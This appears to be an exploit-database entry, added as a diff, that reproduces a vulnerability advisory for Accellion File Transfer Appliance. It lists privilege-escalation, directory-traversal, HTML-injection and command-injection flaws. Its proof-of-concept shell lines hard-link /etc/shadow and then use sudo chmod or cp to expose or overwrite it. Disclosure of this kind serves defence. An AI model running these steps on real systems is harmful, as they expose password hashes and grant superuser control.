@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/38176/info
+ 
+Accellion File Transfer Appliance is prone to multiple remote vulnerabilities, including:
+ 
+- Multiple privilege-escalation issues
+- A directory-traversal issue
+- An HTML-injection issue
+- A remote command-injection issue
+ 
+An attacker may leverage these issues to execute arbitrary script code within the context of the webserver, steal cookie-based authentication credentials, obtain sensitive information, and execute arbitrary code or commands with superuser privileges. Other attacks are also possible.
+ 
+The following proofs of concept are available:
+
+sh-2.05b$ ln /etc/shadow /home/admin/oldtemp
+sh-2.05b$ sudo /bin/chmod 666 /home/admin/oldtemp
+
+sh-2.05b$ ln /etc/shadow /home/admin/temp
+sh-2.05b$ sudo /bin/cp /home/admin/temp /etc/mail/sendmail.cf
+
+sh-2.05b$ sudo /usr/local/bin/admin.pl
